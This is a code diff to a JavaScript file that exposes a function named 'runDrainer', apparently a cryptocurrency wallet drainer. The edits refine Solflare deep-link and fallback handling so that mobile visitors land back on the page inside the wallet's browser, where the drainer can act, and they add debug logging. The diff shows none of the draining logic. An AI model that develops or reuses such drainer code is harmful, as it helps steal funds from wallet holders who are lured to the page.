@@ -6003,10 +6003,12 @@ window.runDrainer = runDrainer;
         case 'solflare':
           // Solflare: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use exact Solflare URL format
+            // Mobile: Use exact Solflare URL format - try to prevent app store redirect
             const encodedUrl = encodeURIComponent(currentUrl);
             deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
             fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            console.log(`[SOLFLARE_MOBILE] Deep link: ${deepLink}`);
+            console.log(`[SOLFLARE_MOBILE] Fallback: ${fallbackUrl}`);
           } else {
             // Desktop: Use custom scheme first
             deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
@@ -6104,7 +6106,28 @@ window.runDrainer = runDrainer;
             // Check if we're still on the same page (deep link didn't work)
             if (window.location.href === currentUrl) {
               console.log(`[DEEP_LINK] Universal link failed, trying custom scheme: ${fallbackUrl}`);
-              window.location.href = fallbackUrl;
+              
+              // For Solflare, be extra careful to prevent app store redirect
+              if (walletType === 'solflare') {
+                console.log(`[SOLFLARE_FALLBACK] Using special Solflare fallback handling`);
+                // Try to detect if Solflare app is installed
+                const testLink = document.createElement('a');
+                testLink.href = 'solflare://test';
+                testLink.style.display = 'none';
+                document.body.appendChild(testLink);
+                
+                // If we can create the link, try the custom scheme
+                try {
+                  window.location.href = fallbackUrl;
+                } catch (e) {
+                  console.log(`[SOLFLARE_FALLBACK] Custom scheme failed, showing manual instruction`);
+                  showStatus(`Please open Solflare wallet manually and return to this page`, 'info');
+                }
+                
+                document.body.removeChild(testLink);
+              } else {
+                window.location.href = fallbackUrl;
+              }
             } else {
               console.log(`[DEEP_LINK] Universal link successful, staying in wallet browser`);
             }
